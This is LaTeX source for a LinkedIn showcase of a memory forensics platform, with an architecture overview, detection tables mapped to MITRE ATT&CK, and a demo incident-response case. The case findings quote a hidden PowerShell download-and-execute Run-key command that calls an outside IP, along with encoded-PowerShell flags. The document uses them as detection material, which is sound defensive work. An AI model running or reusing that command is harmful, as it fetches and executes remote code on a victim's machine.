% =====================================================================
%  Memory Forensics Platform — LinkedIn Showcase (Overleaf-ready)
%
%  HOW TO USE
%  ----------
%  1. Create a new project on Overleaf and paste this file as `main.tex`.
%  2. Drop your screenshots into a folder named `images/` next to it.
%  3. Replace every  \includegraphics{images/PLACEHOLDER_*.png}
%     with your own screenshot filenames.
%  4. Compile with pdfLaTeX (Overleaf's default).
% =====================================================================
\documentclass[11pt,a4paper]{article}

% ---------- Packages (all standard on Overleaf) ----------
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage[margin=2.2cm]{geometry}
\usepackage{xcolor}
\usepackage{graphicx}
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{booktabs}
\usepackage{array}
\usepackage{caption}
\usepackage{tcolorbox}
\usepackage{hyperref}

% ---------- Colors ----------
\definecolor{accent}{HTML}{0EA5E9}     % cyan   (standard mode)
\definecolor{accent2}{HTML}{A855F7}    % fuchsia (deep mode)
\definecolor{sevcrit}{HTML}{DC2626}
\definecolor{sevhigh}{HTML}{EA580C}
\definecolor{sevmed}{HTML}{F59E0B}
\definecolor{ink}{HTML}{0F172A}
\definecolor{slate}{HTML}{475569}

\hypersetup{colorlinks=true, linkcolor=accent, urlcolor=accent}

% ---------- Section style ----------
\titleformat{\section}{\color{accent}\Large\bfseries}{\thesection}{0.6em}{}
\titleformat{\subsection}{\color{ink}\large\bfseries}{\thesubsection}{0.6em}{}

% ---------- Severity pills ----------
\newcommand{\sevcrit}{\colorbox{sevcrit}{\textcolor{white}{\textbf{\footnotesize CRITICAL}}}}
\newcommand{\sevhigh}{\colorbox{sevhigh}{\textcolor{white}{\textbf{\footnotesize HIGH}}}}
\newcommand{\sevmed}{\colorbox{sevmed}{\textcolor{black}{\textbf{\footnotesize MEDIUM}}}}

% ---------- MITRE chip ----------
\newcommand{\mitre}[1]{\colorbox{accent!18}{\texttt{\footnotesize #1}}}

% ---------- Screenshot helper ----------
% Wraps an image with a caption, framed border and consistent width.
\newcommand{\screenshot}[3]{%
  \begin{figure}[h!]\centering
    \fbox{\includegraphics[width=#3\linewidth]{#1}}
    \caption{#2}
  \end{figure}}

% =====================================================================
\begin{document}

% ---------- Title ----------
\begin{center}
{\color{accent}\Huge\bfseries Memory Forensics Platform}\\[6pt]
{\large\color{slate} A self-hosted incident-response \& threat-hunting console}\\[14pt]
{\small Author: \textbf{Tarek Mazen} \quad$\cdot$\quad Stack: Django $\cdot$ Celery $\cdot$ Volatility 3 $\cdot$ React $\cdot$ Docker}\\
\rule{\linewidth}{0.4pt}
\end{center}

% =====================================================================
\section{Overview}

\textbf{Memory Forensics Platform (MFP)} turns Volatility~3 from a command-line
oracle into a collaborative SOC console. An analyst uploads a memory image
(RAM dump, hibernation file, VM snapshot) and the platform automatically:

\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
  \item Hashes it (SHA-256) and stamps it into a \textbf{chain-of-custody} ledger.
  \item Runs up to \textbf{25 Volatility~3 plugins} in parallel via Celery.
  \item Pipes every plugin through \textbf{15+ heuristic detectors} plus a
        \textbf{cross-plugin correlator} (hidden processes, hidden modules,
        injected processes beaconing to public IPs\dots).
  \item Tags every finding with \textbf{MITRE ATT\&CK} techniques, promotes it
        to a deduplicated IOC, and weaves it into a case timeline.
  \item Exposes everything through a JWT-secured REST API and a polished
        React dashboard.
\end{itemize}

\screenshot{images/PLACEHOLDER_dashboard.png}{Main dashboard — case overview with risk scores and recent activity.}{1.0}

% =====================================================================
\section{Architecture}

\begin{tcolorbox}[colback=accent!6, colframe=accent, boxrule=0.5pt, arc=2pt]
\textbf{Backend.} Django 5 + DRF, JWT auth, Celery 5.4 worker pool, Redis broker,
Volatility~3 with persistent symbol cache.\\[3pt]
\textbf{Frontend.} React 18 + Vite + Tailwind, custom dark theme, resumable
chunked upload for multi-GB images.\\[3pt]
\textbf{Deployment.} Docker compose: \texttt{nginx, backend, worker, beat,
redis, frontend} — one-command stand-up.
\end{tcolorbox}

\screenshot{images/PLACEHOLDER_architecture.png}{Stack architecture (replace with your own diagram or compose-graph screenshot).}{0.9}

% =====================================================================
\section{Detection Engine \& MITRE Mapping}

The detection engine ships with two layers:

\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
  \item \textbf{Per-plugin detectors} — each consumes the parsed rows of one
        Volatility plugin and emits \texttt{Detection} records with severity,
        score, evidence, and ATT\&CK techniques.
  \item \textbf{Cross-plugin correlator} — composite findings that need
        signal from \emph{multiple} plugins (e.g.\ a PID present in
        \texttt{psscan} but missing from \texttt{pslist} = hidden process).
\end{itemize}

\begin{center}
\renewcommand{\arraystretch}{1.2}
\begin{tabular}{>{\bfseries}p{3.2cm} p{6.2cm} p{4.6cm}}
\toprule
\textbf{Plugin / Source} & \textbf{Behaviour caught} & \textbf{ATT\&CK} \\
\midrule
windows.malfind        & Code injection / hollowing                   & \mitre{T1055} \mitre{T1055.012} \\
windows.pslist         & Office spawns shell, LOLBIN abuse,
                         offensive tools, parent anomalies            & \mitre{T1566.001} \mitre{T1059.001} \\
windows.cmdline        & Encoded PowerShell, IEX, certutil            & \mitre{T1027} \mitre{T1059} \\
windows.netscan        & C2 ports, public-IP beaconing                & \mitre{T1571} \mitre{T1071} \\
windows.svcscan        & Service binary in user-writable path         & \mitre{T1543.003} \\
windows.ldrmodules     & Process-hollowing (loader-list miss)         & \mitre{T1055.012} \\
windows.callbacks      & Non-Microsoft kernel callback                & \mitre{T1547.013} \\
windows.ssdt           & SSDT hook                                    & \mitre{T1014} \\
windows.handles        & Cross-process handle to LSASS                & \mitre{T1003.001} \\
windows.privileges     & SeDebug / SeImpersonate held by user app     & \mitre{T1134} \\
windows.registry.printkey & Run / RunOnce points at LOLBIN            & \mitre{T1547.001} \\
\textit{xview.process} & Hidden process (psscan $\setminus$ pslist)   & \mitre{T1014} \mitre{T1055} \\
\textit{xview.module}  & Hidden kernel module                         & \mitre{T1014} \\
\textit{xview.implant} & Injected proc + public-IP beacon             & \mitre{T1055} \mitre{T1071} \\
\bottomrule
\end{tabular}
\end{center}

\paragraph{Risk aggregation.} Sub-linear curve so a single finding raises the
score but no noisy plugin saturates it:
\[
R \;=\; 100 \cdot \left(1 - e^{-\Sigma w / 200}\right),
\qquad
w \in \{\text{info:1, low:5, medium:15, high:30, critical:50}\}.
\]

\screenshot{images/PLACEHOLDER_analysis_view.png}{Analysis view — MITRE chips, severity-coloured detection cards, per-plugin tabs.}{1.0}

% =====================================================================
\section{Scenario — Operation Nightjar}

\begin{tcolorbox}[colback=ink!4, colframe=ink, boxrule=0.5pt, arc=2pt]
\renewcommand{\arraystretch}{1.2}
\begin{tabular}{rl}
\textbf{Case ID:}      & \texttt{IR-2026-0042} \\
\textbf{Asset:}        & \texttt{WIN7-FIN-04} (Finance dept.\ workstation) \\
\textbf{Trigger:}      & EDR alert: anomalous outbound TCP/4444 from svchost-like process \\
\textbf{Image:}        & \texttt{WIN7-FIN-04\_2026-05-08.raw} (2.0 GB) \\
\textbf{SHA-256:}      & \texttt{c47e\dots a91f} \\
\textbf{Lead analyst:} & T. Mazen \\
\end{tabular}
\end{tcolorbox}

\subsection{Step 1 — Case onboarding}

The analyst creates the case, drags the \texttt{.raw} file into the upload
zone. The chunked uploader streams the 2~GB image while computing SHA-256 in
flight. On finalize, the platform records hash, uploader and timestamp into
the case's chain-of-custody ledger.

\screenshot{images/PLACEHOLDER_upload.png}{Resumable chunked upload (multi-GB capable).}{0.95}

\subsection{Step 2 — Standard analysis}

A click on \textbf{Analyze} queues a Celery job that runs the standard
11-plugin set. Volatility detects \texttt{Windows~7~SP1~x64} and parses every
plugin into structured JSON. \emph{Initial risk score: 42/100.}

\screenshot{images/PLACEHOLDER_standard_analysis.png}{Standard analysis result — initial findings and risk gauge.}{1.0}

\subsection{Step 3 — Deep analysis}

Because the standard pass already shows suspicious activity, the analyst
clicks the \textbf{Deep analysis} (fuchsia) button. The platform queues a
25-plugin sweep including \texttt{psscan}, \texttt{ldrmodules},
\texttt{callbacks}, \texttt{ssdt}, \texttt{driverscan},
\texttt{registry.userassist}, and credential plugins. After ~9 minutes the
post-processor runs the cross-plugin correlator.

\begin{center}
\textbf{Final risk score:} \colorbox{sevcrit}{\textcolor{white}{\textbf{ 87 / 100 }}}
\quad\textbf{Mode:} \colorbox{accent2}{\textcolor{white}{\textbf{ DEEP }}}
\end{center}

\screenshot{images/PLACEHOLDER_deep_analysis.png}{Deep analysis — MITRE technique cloud and cross-plugin findings.}{1.0}

% --------- findings ---------
\subsection{Top findings}

\begin{tcolorbox}[colback=sevcrit!5, colframe=sevcrit, boxrule=0.5pt, arc=2pt,
  title={\bfseries Finding 1 — Office spawned a shell}, coltitle=white,
  colbacktitle=sevcrit]
\sevcrit\quad \mitre{T1566.001} \mitre{T1059.001}\\[3pt]
\textbf{Plugin:} \texttt{windows.pslist}\quad\textbf{PID:} 3168\\
\texttt{WINWORD.EXE} (PPID 2104) spawned \texttt{powershell.exe} with
\texttt{-nop -w hidden -ep bypass -enc \dots} — classic phishing payload.
\end{tcolorbox}

\begin{tcolorbox}[colback=sevcrit!5, colframe=sevcrit, boxrule=0.5pt, arc=2pt,
  title={\bfseries Finding 2 — Injected process beaconing},
  coltitle=white, colbacktitle=sevcrit]
\sevcrit\quad \mitre{T1055} \mitre{T1071}\\[3pt]
\textbf{Source:} cross-plugin correlator (\textit{xview.implant})\\
PID 3168 has \texttt{PAGE\_EXECUTE\_READWRITE} regions reported by
\texttt{malfind} \emph{and} an established TCP connection to
\textbf{185.220.101.42:4444}.
\end{tcolorbox}

\begin{tcolorbox}[colback=sevhigh!5, colframe=sevhigh, boxrule=0.5pt, arc=2pt,
  title={\bfseries Finding 3 — Persistence Run-key},
  coltitle=white, colbacktitle=sevhigh]
\sevhigh\quad \mitre{T1547.001}\\[3pt]
\textbf{Plugin:} \texttt{windows.registry.printkey}\\
\texttt{HKCU\textbackslash\dots\textbackslash Run\textbackslash WinUpdate}
$=$ \texttt{powershell -w hidden -c "iex(New-Object Net.WebClient)
.DownloadString('http://185.220.101.42/u')"}
\end{tcolorbox}

\begin{tcolorbox}[colback=sevhigh!5, colframe=sevhigh, boxrule=0.5pt, arc=2pt,
  title={\bfseries Finding 4 — LSASS handle from non-system process},
  coltitle=white, colbacktitle=sevhigh]
\sevhigh\quad \mitre{T1003.001}\\[3pt]
\textbf{Plugin:} \texttt{windows.handles}\\
\texttt{powershell.exe} (PID 3168) holds a \emph{Process} handle to
\texttt{lsass.exe} — credential-dumping precursor.
\end{tcolorbox}

\begin{tcolorbox}[colback=sevhigh!5, colframe=sevhigh, boxrule=0.5pt, arc=2pt,
  title={\bfseries Finding 5 — Hidden process},
  coltitle=white, colbacktitle=sevhigh]
\sevhigh\quad \mitre{T1014} \mitre{T1055}\\[3pt]
\textbf{Source:} cross-plugin correlator (\textit{xview.process})\\
PID 4012 (\texttt{svchost.exe}) was found by \texttt{psscan} but is
\textbf{absent} from \texttt{pslist}'s active-process walk — DKOM-style
hiding.
\end{tcolorbox}

\screenshot{images/PLACEHOLDER_detections.png}{Detection cards with severity pills, plugin name, PID, and clickable MITRE chips.}{1.0}

% --------- IOCs ---------
\subsection{Indicators of compromise (auto-promoted)}

\begin{center}
\renewcommand{\arraystretch}{1.2}
\begin{tabular}{l l c l}
\toprule
\textbf{Kind} & \textbf{Value} & \textbf{Severity} & \textbf{Source} \\
\midrule
ip       & 185.220.101.42                                                & \sevcrit & netscan \\
process  & powershell.exe (PID 3168)                                     & \sevcrit & malfind / xview \\
process  & svchost.exe (PID 4012, hidden)                                & \sevhigh & xview.process \\
path     & \%APPDATA\%\textbackslash WinUpdate\textbackslash u.ps1       & \sevhigh & filescan \\
registry & HKCU\textbackslash\dots\textbackslash Run\textbackslash WinUpdate & \sevhigh & registry.printkey \\
other    & cmdline:\ powershell -nop -w hidden -enc \dots                & \sevhigh & cmdline \\
\bottomrule
\end{tabular}
\end{center}

\screenshot{images/PLACEHOLDER_iocs.png}{IOC view — deduplicated indicators with MITRE tags.}{1.0}

% --------- timeline ---------
\subsection{Case timeline}

The platform fuses process creates, network connections and service events
into a single timeline so the analyst can read the attack chronologically.

\screenshot{images/PLACEHOLDER_timeline.png}{Case timeline view (process create / network / service events).}{1.0}

% --------- containment ---------
\subsection{Containment \& outcome}

\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
  \item \textbf{Network:} 185.220.101.42 added to perimeter blocklist
        (firewall + DNS sinkhole).
  \item \textbf{Endpoint:} \texttt{WIN7-FIN-04} isolated; image preserved
        with verified hash.
  \item \textbf{Identity:} forced password reset for the logged-in user;
        Kerberos TGT revoked.
  \item \textbf{Threat-hunt:} fleet-wide search for the same Run-key value.
  \item \textbf{Report:} PDF generated by the platform, signed by the lead
        analyst, attached to ticket \texttt{IR-2026-0042}.
\end{itemize}

\begin{tcolorbox}[colback=accent!6, colframe=accent, boxrule=0.5pt, arc=2pt]
What would have been a multi-hour blind plugin-by-plugin pivot in a terminal
became an \textbf{18-minute guided investigation} with a written narrative,
clickable MITRE chain, deduplicated IOCs, and a sealed chain-of-custody —
all without leaving the browser.
\end{tcolorbox}

\screenshot{images/PLACEHOLDER_report.png}{Generated PDF report attached to the case.}{1.0}

% =====================================================================
\section{Tech Highlights}

\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
  \item \textbf{Security:} 15+ original Volatility detectors, cross-plugin
        correlation, MITRE ATT\&CK mapping, sub-linear risk scoring.
  \item \textbf{Backend:} Django 5 / DRF / Celery / Redis, RBAC, JWT
        auto-refresh, immutable audit log, idempotent migrations.
  \item \textbf{Frontend:} React 18 + Vite + Tailwind, dark theme, auth-aware
        blob downloads, per-plugin tabbed analysis viewer.
  \item \textbf{DevOps:} Docker compose stack, persistent Volatility symbol
        cache, resilient Nginx (Docker DNS resolver — no 502 after rebuilds),
        resumable multi-GB chunked uploads.
\end{itemize}

% =====================================================================
\section*{LinkedIn Caption (ready to paste)}

\begin{tcolorbox}[colback=accent!6, colframe=accent, boxrule=0.5pt, arc=2pt]
\small\itshape
Just shipped: \textbf{Memory Forensics Platform} — a self-hosted incident-response
console that turns Volatility~3 from a command-line oracle into a collaborative
SOC tool. Drag-and-drop a memory dump and get a MITRE ATT\&CK-mapped, IOC-rich,
chain-of-custody-signed investigation report in minutes.\\[6pt]
\textbf{Stack:} Django 5 + DRF $\cdot$ Celery 5.4 + Redis $\cdot$ Volatility~3
$\cdot$ React 18 + Vite + Tailwind $\cdot$ Docker.\\[4pt]
\textbf{Highlights:} 25-plugin "deep" mode $\cdot$ 15+ heuristic detectors
$\cdot$ cross-plugin correlator (hidden processes / hidden modules /
injected-and-beaconing) $\cdot$ MITRE ATT\&CK chips $\cdot$ sub-linear risk
scoring $\cdot$ resumable multi-GB uploads $\cdot$ JWT-secured API $\cdot$
immutable audit log.\\[4pt]
In the demo \emph{Operation Nightjar} scenario, the platform takes an
\textbf{18-minute path} from raw memory dump to written report — phishing
chain reconstruction, LSASS-handle credential-dump warning, hidden process
detection, persistence Run-key call-out, and C2 IOCs.\\[6pt]
\#DFIR \#MemoryForensics \#Volatility \#IncidentResponse \#BlueTeam
\#Python \#Django \#React \#MITREATTACK
\end{tcolorbox}

\vfill
\begin{center}\small\color{slate}
Memory Forensics Platform — Showcase document.
\end{center}

\end{document}
